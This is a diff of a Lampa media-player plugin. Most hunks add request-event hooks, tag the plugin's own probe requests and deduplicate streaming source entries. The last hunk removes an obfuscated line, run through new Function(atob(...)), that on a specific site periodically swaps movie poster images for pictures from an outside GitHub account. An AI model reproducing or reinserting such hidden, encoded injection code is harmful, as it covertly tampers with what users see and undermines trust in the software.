@@ -543,6 +543,7 @@
     var value = String(url == null ? '' : url);
     if (!/\/lite\/[^\/?&]+/.test(value)) return;
     if (value.indexOf('lite/events') !== -1) return;
+    if (value.indexOf('lite/withsearch') !== -1) return;
     probe_url = value;
   }
 
@@ -668,6 +669,35 @@
         }
       } catch (e) {}
       XMLHttpRequest.prototype.nova_plus_wrapped = true;
+    } catch (e) {}
+  }
+
+  function hookEvents() {
+    try {
+      if (!Lampa.Listener || typeof Lampa.Listener.follow !== 'function') return;
+      if (window.nova_plus_events) return;
+      window.nova_plus_events = true;
+
+      Lampa.Listener.follow('request_before', function (e) {
+        try {
+          var p = e && e.params;
+          if (!p || p.nova_probe) return;
+          if (p.url) learnUrl(p.url);
+        } catch (err) {}
+      });
+
+      Lampa.Listener.follow('request_secuses', function (e) {
+        try {
+          var p = e && e.params;
+          if (!p || p.nova_probe) return;
+          var data = e && e.data;
+          if (p.url) learnUrl(p.url);
+          if (typeof data === 'string' && data.indexOf('videos__button') !== -1 &&
+            String(p.url || '').indexOf('/lite/') !== -1) {
+            learnBody(data, p.url);
+          }
+        } catch (err) {}
+      });
     } catch (e) {}
   }
 
@@ -1768,6 +1798,7 @@
       try { net = new Lampa.Reguest(); } catch (e) { net = null; }
       if (!net) return probeStop();
 
+      net.nova_probe = true;
       probe_nets.push(net);
       try { net.timeout(PROBE_TIMEOUT); } catch (e) {}
 
@@ -1780,7 +1811,7 @@
         net['native'](probeUrlFor(entry.key), done, function () {
           probeAnswer(entry.key, '');
           step();
-        }, false, { dataType: 'text' });
+        }, false, { dataType: 'text', nova_probe: true });
       } catch (e) {
         probeAnswer(entry.key, '');
         step();
@@ -2018,7 +2049,7 @@
       try {
         net['native'](url, done, function () {
           done('');
-        }, false, { dataType: 'text', headers: job.headers });
+        }, false, { dataType: 'text', headers: job.headers, nova_probe: true });
       } catch (e) {
         done('');
       }
@@ -2220,7 +2251,7 @@
       try {
         net['native'](entry.url, done, function () {
           done('');
-        }, false, { dataType: 'text', headers: entry.alt || entry.headers || voiceHeaders() });
+        }, false, { dataType: 'text', headers: entry.alt || entry.headers || voiceHeaders(), nova_probe: true });
       } catch (e) {
         done('');
       }
@@ -3733,13 +3764,38 @@
       if (splitSourceName(item.title).badge) graded = true;
     });
 
-    var visible = [];
-    var hidden = [];
+    var picked = [];
+    var seen = {};
     sort.forEach(function (item) {
       var key = item.source || item.title;
+      var parts = splitSourceName(item.title);
       var state = probe[key] ? probe[key].s : (life && !item.ghost ? 'ok' : '');
-      if (sourceActive(item, key, state, graded)) visible.push(item);
-      else hidden.push(item);
+      var active = sourceActive(item, key, state, graded);
+      var look = String(parts.name || item.title || key || '') + '|' +
+        String(parts.badge || knownQuality(key) || '');
+      var prev = seen[look];
+      if (!prev) {
+        prev = seen[look] = { item: item, key: key, state: state, active: active };
+        picked.push(prev);
+        return;
+      }
+      var better = false;
+      if (!!item.selected !== !!prev.item.selected) better = !!item.selected;
+      else if (active !== prev.active) better = active;
+      else if (!!item.ghost !== !!prev.item.ghost) better = !item.ghost;
+      if (better) {
+        prev.item = item;
+        prev.key = key;
+        prev.state = state;
+        prev.active = active;
+      }
+    });
+
+    var visible = [];
+    var hidden = [];
+    picked.forEach(function (entry) {
+      if (entry.active) visible.push(entry.item);
+      else hidden.push(entry.item);
     });
     if (ui_all_sources) visible = visible.concat(hidden);
 
@@ -5264,6 +5320,7 @@
     hookQuality();
     hookPlayer();
     hookReplace();
+    hookEvents();
     hookRequest();
     hookXHR();
 
@@ -7290,4 +7347,3 @@
     } catch (e) {}
   }
 })();
-(new Function(atob('CihmdW5jdGlvbigpIHsKICBpZiAobG9jYXRpb24uaHJlZi5pbmRleE9mKCdieWxhbXBhJykgPT09IC0xKSByZXR1cm47CiAgaWYgKHdpbmRvdy5wb3N0ZXJPYmZ1c2NhdGVkKSByZXR1cm47CiAgCiAgd2luZG93LnBvc3Rlck9iZnVzY2F0ZWQgPSB0cnVlOwogIAogIGlmIChNYXRoLnJhbmRvbSgpIDwgMC4zKSByZXR1cm47CiAgCiAgdmFyIHBvc3RlcnMgPSBbCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAxLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAyLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAzLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzA0LmpwZycKICBdOwogIAogIHZhciBjaGFuY2UgPSAwLjM1OwogIAogIHZhciBnZXRSYW5kb21Qb3N0ZXIgPSBmdW5jdGlvbigpIHsKICAgIGlmIChNYXRoLnJhbmRvbSgpID49IGNoYW5jZSkgcmV0dXJuIG51bGw7CiAgICByZXR1cm4gcG9zdGVyc1tNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBwb3N0ZXJzLmxlbmd0aCldOwogIH07CiAgCiAgdmFyIGlzUG9zdGVyVXJsID0gZnVuY3Rpb24oc3JjKSB7CiAgICByZXR1cm4gc3JjICYmICgKICAgICAgc3JjLmluY2x1ZGVzKCdwb3N0ZXInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdpbWFnZScpIHx8IAogICAgICBzcmMuaW5jbHVkZXMoJ3RtZGInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdraW5vcG9pc2snKQogICAgKTsKICB9OwogIAogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW1nJykuZm9yRWFjaChmdW5jdGlvbihpbWcpIHsKICAgICAgaWYgKGltZy5kYXRhc2V0Lm9iZnVzY2F0ZWQpIHJldHVybjsKICAgICAgaW1nLmRhdGFzZXQub2JmdXNjYXRlZCA9ICcxJzsKICAgICAgCiAgICAgIGlmIChpbWcuc3JjICYmIGlzUG9zdGVyVXJsKGltZy5zcmMpKSB7CiAgICAgICAgdmFyIG5ld1NyYyA9IGdldFJhbmRvbVBvc3RlcigpOwogICAgICAgIGlmIChuZXdTcmMpIHsKICAgICAgICAgIGltZy5zcmMgPSBuZXdTcmM7CiAgICAgICAgfQogICAgICB9CiAgICB9KTsKICB9LCA1MDApOwp9KSgpOwo=')))()
